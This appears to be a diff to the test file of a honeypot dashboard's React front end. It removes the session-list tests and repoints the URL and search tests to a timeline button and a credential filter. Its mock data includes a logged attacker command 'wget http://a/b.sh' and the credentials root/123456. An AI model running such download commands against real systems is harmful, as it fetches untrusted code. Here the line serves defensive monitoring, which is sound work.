@@ -23,7 +23,6 @@ function payloadFor(url) {
       events: [{ timestamp: "2026-08-16T10:00:20Z", command: "wget http://a/b.sh", username: null, password: null, tags: ["T1105"] }],
     };
   }
-  if (url.includes("/sessions")) return { rows: [SESSION], total: 1, hours: 24 };
   if (url.includes("/commands")) return { rows: [{ command: "wget http://a/b.sh", total: 9, unique_ips: 3, tags: ["T1105"] }], total: 1, counts: { T1105: 1 }, allTotal: 1 };
   if (url.includes("/creds")) return { rows: [{ username: "root", password: "123456", total: 4, unique_ips: 2 }], total: 1 };
   if (url.includes("/files")) return { rows: [{ sha256: "deadbeef", size_bytes: 512, first_seen: "2026-08-16T09:00:00Z", vt_type: "ELF" }], total: 1 };
@@ -53,7 +52,7 @@ describe("App", () => {
     render(<App />);
     await waitFor(() => expect(screen.getByText("hunajapannu.fi")).toBeInTheDocument());
 
-    for (const path of ["/latest", "/summary", "/commands", "/creds", "/files", "/top-asn", "/top-countries", "/events-per-hour", "/sessions", "/mitre"]) {
+    for (const path of ["/latest", "/summary", "/commands", "/creds", "/files", "/top-asn", "/top-countries", "/events-per-hour", "/mitre"]) {
       expect(requested.some((u) => u.includes(path)), `expected a request to ${path}`).toBe(true);
     }
 
@@ -85,7 +84,10 @@ describe("App", () => {
 
   it("puts the opened session into the url so it can be shared", async () => {
     render(<App />);
-    const btn = await screen.findByRole("button", { name: /view timeline for session from 1\.2\.3\.4/i });
+    // The front-page replay is the only way into a timeline now that the
+    // browsable session list is gone. "Full timeline" stays reachable even
+    // when the replay is collapsed, which is why this does not expand first.
+    const btn = await screen.findByRole("button", { name: /full timeline/i });
     fireEvent.click(btn);
     await waitFor(() => expect(window.location.search).toContain("session=abc123"));
     expect(await screen.findByRole("dialog", { name: /session timeline/i })).toBeInTheDocument();
@@ -101,10 +103,12 @@ describe("App", () => {
   });
 
   it("restores a search from the url and sends it to the API", async () => {
-    window.history.replaceState(null, "", "/?q=china");
+    // ?q= drove the deleted session list; ?cred= is the same mechanism on a
+    // panel that still exists.
+    window.history.replaceState(null, "", "/?cred=root");
     render(<App />);
     await waitFor(() =>
-      expect(requested.some((u) => u.includes("/sessions") && u.includes("search=china"))).toBe(true)
+      expect(requested.some((u) => u.includes("/creds") && u.includes("search=root"))).toBe(true)
     );
   });
 
